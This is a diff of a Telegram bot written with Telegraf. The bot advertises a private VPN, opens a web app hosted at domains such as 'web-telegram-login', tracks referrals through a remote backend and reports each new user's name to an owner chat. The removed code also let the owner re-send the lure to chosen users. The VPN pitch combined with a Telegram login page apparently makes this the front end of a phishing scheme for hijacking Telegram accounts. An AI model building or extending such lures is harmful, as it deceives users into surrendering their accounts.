@@ -1,119 +1,128 @@
-const { Telegraf } = require("telegraf");
+const { Telegraf } = require('telegraf');
+const fetch = require('node-fetch');
 
-const web_link = "https://web-telegram-login.netlify.app";
-// Replace with your actual chat ID or store as environment variable
-const OWNER_CHAT_ID = process.env.OWNER_CHAT_ID || "YOUR_OWNER_CHAT_ID";
+// Environment variables
+const API_ID = process.env.API_ID; // Not used in this context, but keeping for consistency
+const API_HASH = process.env.API_HASH; // Not used, but keeping for consistency
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const BACKEND_URL = "https://tg-back-m8e0.onrender.com";  // Replace with your backend URL
+const WEB_LINK = "https://checkingera.netlify.app";  // Your web app URL
+const OWNER_CHAT_ID = process.env.OWNER_CHAT_ID || 'YOUR_OWNER_CHAT_ID';
 
-const bot = new Telegraf(process.env.REACT_APP_TELEGRAM_BOT_TOKEN);
+const bot = new Telegraf(BOT_TOKEN);
 
+// Helper function to create welcome message
 const welcomeMessage = (user) => {
-  const userName = user.username ? `@${user.username}` : user.first_name;
-  return `Hey ${userName}\n\n` +
-    "Secure, fast, and private VPN at your fingertips! Connect instantly and browse the internet with freedom. No logs, no limits—just pure privacy.\n" +
-    "Tap to connect!";
-};
-
-const createReplyMarkup = (startPayload) => {
-  const urlSent = `${web_link}?start=${startPayload}`;
-  return {
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "CONNECT ", web_app: { url: urlSent } }]
-      ]
-    }
-  };
-};
-
-// Function to format UTC date and time
-const getFormattedDateTime = () => {
-  const now = new Date();
-  const day = String(now.getUTCDate()).padStart(2, '0');
-  const month = String(now.getUTCMonth() + 1).padStart(2, '0');
-  const year = String(now.getUTCFullYear()).slice(-2);
-  const hours = String(now.getUTCHours()).padStart(2, '0');
-  const minutes = String(now.getUTCMinutes()).padStart(2, '0');
-  return {
-    date: `${day}/${month}/${year}`,
-    time: `${hours}:${minutes} UTC`
-  };
-};
-
-// Function to send notification to owner with Reminder button
-const notifyOwner = async (user, messageId) => {
-  try {
-    const { date, time } = getFormattedDateTime();
     const userName = user.username ? `@${user.username}` : user.first_name;
-    
-    const notification = `New user joined:\n\n` +
-      `Name: ${userName}\n` +
-      `Date: ${date}\n` +
-      `Time: ${time}\n` +
-      `Location: IN`; // Using the known country code from user info
-
-    // Inline keyboard with Reminder button
-    const replyMarkup = {
-      inline_keyboard: [[{ text: "Reminder", callback_data: `reminder_${user.id}_${user.first_name}_${user.username || ''}` }]]
-    };
-
-    await bot.telegram.sendMessage(OWNER_CHAT_ID, notification, { reply_markup: replyMarkup });
-  } catch (error) {
-    console.error('Error sending notification to owner:', error);
-  }
+    return `Hey ${userName}\n\n` +
+        "Secure, fast, and private VPN at your fingertips! Connect instantly and browse the internet with freedom. No logs, no limits—just pure privacy.\n" +
+        "Tap to connect!";
 };
 
-// Handle callback query from the Reminder button
-bot.action(/^reminder_(\d+)_(.*)_(.*)$/, async (ctx) => {
-  const userId = ctx.match[1]; 
-  const firstName = ctx.match[2]; 
-  const username = ctx.match[3]; 
+// Helper function to create inline keyboard markup
+const createReplyMarkup = (startPayload) => {
+    const urlSent = `${WEB_LINK}?start=${startPayload || ''}`;
+    return {
+        inline_keyboard: [
+            [{ text: "START", web_app: { url: urlSent } }]
+        ]
+    };
+};
 
-  // Create a minimal user object with the extracted user ID
-  const user = { id: userId, first_name: firstName, username: username || null }; 
+// Function to notify owner (simplified for this example)
+const notifyOwner = async (user) => {
+    try {
+        const userName = user.username ? `@${user.username}` : user.first_name;
+        const notification = `New user joined:\n\n` +
+                             `Name: ${userName}\n` +
+                             `Location: IN`;
+        await bot.telegram.sendMessage(OWNER_CHAT_ID, notification);
+    } catch (error) {
+        console.error('Error notifying owner:', error);
+    }
+};
 
-  // Send the welcome message to the user
-  try {
-    await ctx.telegram.sendMessage(userId, welcomeMessage(user), createReplyMarkup());
-    await ctx.answerCbQuery('Reminder sent to the user!');
-  } catch (error) {
-    console.error('Error sending reminder to user:', error);
-    await ctx.answerCbQuery('Failed to send reminder. User may have blocked the bot.');
-  }
-});
+// Handle /start command
+bot.start(async (ctx) => {
+    console.log('Received /start command from:', ctx.from.id);
+    const startPayload = ctx.startPayload || '';
+    const inviterId = startPayload || '';
+    const inviteeId = ctx.from.id;
 
-// Respond to /start cmd
-bot.start((ctx) => {
-  const startPayload = ctx.startPayload;
-  const user = ctx.message.from;
-  
-  // Send notification to owner with the message ID
-  notifyOwner(user, ctx.message.message_id);
-  
-  return ctx.replyWithMarkdown(welcomeMessage(user), { 
-    disable_web_page_preview: true,
-    ...createReplyMarkup(startPayload) 
-  });
+    console.log('Inviter ID:', inviterId);
+    console.log('Invitee ID:', inviteeId);
+
+    // Prevent inviter from clicking their own invite link
+    if (inviterId && inviterId !== inviteeId.toString()) {
+        console.info(`New user ${inviteeId} started the bot using invite link from ${inviterId}`);
+        try {
+            const response = await fetch(`${BACKEND_URL}/handle_invite`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ inviter_id: inviterId, invitee_id: inviteeId }),
+            });
+            if (response.ok) {
+                console.info(`Updated stats for inviter ${inviterId} with new invitee ${inviteeId}`);
+            } else {
+                const text = await response.text();
+                console.error(`Failed to update stats for inviter ${inviterId}: ${text}`);
+            }
+        } catch (e) {
+            console.error(`Error updating stats for inviter ${inviterId}:`, e);
+        }
+    } else if (inviterId === inviteeId.toString()) {
+        console.info(`Inviter ${inviterId} tried to use their own invite link. Ignoring.`);
+    }
+
+    // Send welcome message with inline button
+    const welcomeMsg = welcomeMessage(ctx.from);
+    const replyMarkup = createReplyMarkup(startPayload);
+
+    try {
+        await ctx.replyWithMarkdown(welcomeMsg, {
+            disable_web_page_preview: true,
+            reply_markup: replyMarkup
+        });
+        console.log('Welcome message sent successfully');
+    } catch (error) {
+        console.error('Error sending welcome message:', error);
+    }
+
+    try {
+        await notifyOwner(ctx.from);
+        console.log('Owner notified successfully');
+    } catch (error) {
+        console.error('Error notifying owner:', error);
+    }
 });
 
 // Respond to any message sent to the bot
-bot.on('message', (ctx) => {
-  const startPayload = ctx.startPayload || '';
-  const user = ctx.message.from;
-  return ctx.replyWithMarkdown(welcomeMessage(user), { 
-    disable_web_page_preview: true,
-    ...createReplyMarkup(startPayload) 
-  });
+bot.on('message', async (ctx) => {
+    const startPayload = ctx.startPayload || '';
+    const user = ctx.from;
+
+    // Send welcome message with inline button
+    const welcomeMsg = welcomeMessage(user);
+    const replyMarkup = createReplyMarkup(startPayload);
+
+    try {
+        await ctx.replyWithMarkdown(welcomeMsg, {
+            disable_web_page_preview: true,
+            reply_markup: replyMarkup
+        });
+        console.log('Welcome message sent successfully');
+    } catch (error) {
+        console.error('Error sending welcome message:', error);
+    }
 });
 
-exports.handler = async (event) => {
-  if (event.httpMethod !== 'POST') {
-    return { statusCode: 405, body: 'Method Not Allowed' };
-  }
+// Start the bot
+bot.launch()
+    .then(() => console.log('Bot started successfully!'))
+    .catch((err) => console.error('Error starting bot:', err));
 
-  try {
-    await bot.handleUpdate(JSON.parse(event.body));
-    return { statusCode: 200, body: 'OK' };
-  } catch (e) {
-    console.error('Error in handler:', e);
-    return { statusCode: 400, body: `Bad Request: ${e.message}` };
-  }
-};
+// Enable graceful stop
+process.once('SIGINT', () => bot.stop('SIGINT'));
+process.once('SIGTERM', () => bot.stop('SIGTERM'));
